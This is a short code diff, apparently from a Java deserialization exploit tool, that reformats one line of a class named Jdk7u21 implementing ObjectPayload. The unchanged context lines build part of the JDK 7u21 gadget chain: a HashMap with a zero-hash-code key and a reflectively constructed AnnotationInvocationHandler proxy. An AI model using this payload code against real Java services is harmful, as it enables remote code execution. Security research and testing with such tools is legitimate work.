@@ -72,7 +72,7 @@ public class Jdk7u21 implements ObjectPayload<Object> {
         map.put(zeroHashCodeStr, "foo");
 
         // 使用 AnnotationInvocationHandler 为 HashMap 创建动态代理
-        Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor<?> constructor = c.getDeclaredConstructors()[0];
         constructor.setAccessible(true);
         InvocationHandler tempHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
